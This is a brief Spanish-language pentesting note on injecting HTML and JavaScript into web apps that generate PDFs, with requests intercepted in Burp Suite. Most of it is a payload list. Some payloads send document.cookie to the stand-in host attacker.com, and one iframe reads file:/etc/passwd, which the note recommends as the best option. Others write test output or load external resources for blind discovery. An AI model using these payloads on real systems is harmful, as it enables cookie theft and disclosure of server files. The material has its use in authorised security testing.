Se toma la peticion con burnsuite y se puede enviar una injection a travez de sus parametros si la web genera un PDF puedes probar estos payloads

```html
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">


<!-- La mejor opción -->
<iframe src=file:/etc/passwd height=1000px width=1000px></iframe>
```
